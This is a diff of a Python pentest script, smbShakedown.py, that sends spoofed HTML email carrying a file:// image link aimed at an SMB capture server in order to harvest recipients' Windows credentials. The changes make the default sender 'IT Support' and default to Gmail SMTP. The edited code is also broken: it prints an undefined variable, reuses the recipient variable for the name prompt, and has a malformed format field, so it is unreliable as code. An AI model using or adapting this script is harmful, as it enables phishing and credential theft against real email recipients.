@@ -1,4 +1,3 @@
-
 #/usr/bin/python
 # Description: A simplified SMB Email Client Attack script used for External/Internal pentests.
 # Created by: Nick Sanzotta / @beamr
@@ -36,7 +35,8 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 		if choice in yes:
 			smtpserver.sendmail(senderAddress, recipients, emailMessage)
 			print("Successfully sent message(s)!")
-			#SMTP close?
+			#SMTP close/quit
+			smtpserver.quit()
 			return True
 		elif choice in no:
 			print("Ok no mail sent.")
@@ -50,25 +50,27 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 
 def main():
 	ipAddress = get_ip_address()
-	smtpServerAddress = raw_input('Enter SMTP Server address: ')
+	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
 	print('ENTERED: "%s"' % smtpServerAddress + "\n")
-	smtpServerPort = raw_input('Enter your SMTP Server Port[25]: ') or 25
+	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
 	print('ENTERED: "%s"' % smtpServerPort + "\n")
-	smtpUser = raw_input('Enter SMTP Server username: ')
+	smtpUser = raw_input('Enter SMTP Server username[user@gmail.com]: ') or 'user@gmail.com'
 	print('ENTERED: "%s"' % smtpUser + "\n")
 	smtpPassword = getpass.getpass(r'Enter SMTP Server password: ')
 	print("\n")
 	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+ipAddress+']: ') or  ipAddress
 	print('ENTERED:' "%s" % smbCaptureServer + "\n")
-	senderName = raw_input('Enter "from name":[John Doe]') or  'John Doe'
+	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
 	print('ENTERED:' "%s" % senderName + "\n")
-	senderAddress = raw_input('Enter "from address":[jdoe@nonexistentdomain.com]') or  'jdoe@nonexistentdomain.com'
+	senderAddress = raw_input('Enter "from address":[support@nonexistentdomain.com]') or  'support@nonexistentdomain.com'
 	print('ENTERED:' "%s" % senderAddress + "\n")
+	recipients = raw_input('Enter recipient(s) name: ')
+	print('ENTERED:' "%s" % recipientName + "\n")
 	recipients = raw_input('Enter recipient(s) address: ')
 	print('ENTERED:' "%s" % recipients + "\n")
 
 	message = """From: {0} <{1}>
-To: To Person <{2}>
+To: {2}} <{3}>
 MIME-Version: 1.0
 Content-type: text/html
 Subject: smbShakedown.py test.
@@ -77,9 +79,9 @@ Subject: smbShakedown.py test.
 ...
 <b>smbShakedown.py test message.</b>
 <br>
-<img src=file://{3}/image/foo.gif>
+<img src=file://{4}/image/foo.gif>
 """
-	emailMessage = message.format(senderName, senderAddress, recipients, ipAddress)
+	emailMessage = message.format(senderName, senderAddress, recipientName, recipients, ipAddress)
 	print('Email message preview below:')
 	time.sleep(1)
 	print(emailMessage)
